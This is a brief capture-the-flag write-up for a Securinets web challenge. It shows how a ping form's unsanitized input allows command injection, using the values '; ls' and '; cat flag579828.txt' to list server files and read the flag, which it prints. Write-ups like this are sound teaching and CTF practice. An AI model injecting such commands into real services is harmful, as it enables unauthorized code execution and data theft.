# Terminal Treachery writeup

we first visit our webpage getting a description of how this web page pings an ip we provide via the input box bellow 

the first thought that comes to mind is the ping command 
```
ping 127.0.0.1 
```
so the application might be working by executing `ping + your_input` , for example if your input is `google.com` the command will become `ping google.com` and then returns the result of your command 

we can leverage this very easily by putting our malicious payload as `; ls` , when we change this in our command it's gonna become `ping; ls` which will execute both commands and return the output getting our output of 
```
Ping Result:

__pycache__
app.py
cmd.php
dir.php
flag579828.txt
output.txt
requirements.txt
rfi.php
```
we notice there the name of our flag so we simply change `ls` with `cat flag579828.txt` 

and we get our flag : `Securinets{r3c0mm3nd_1nject10ns_4ll_d4ys}`

written by : **Chuuya**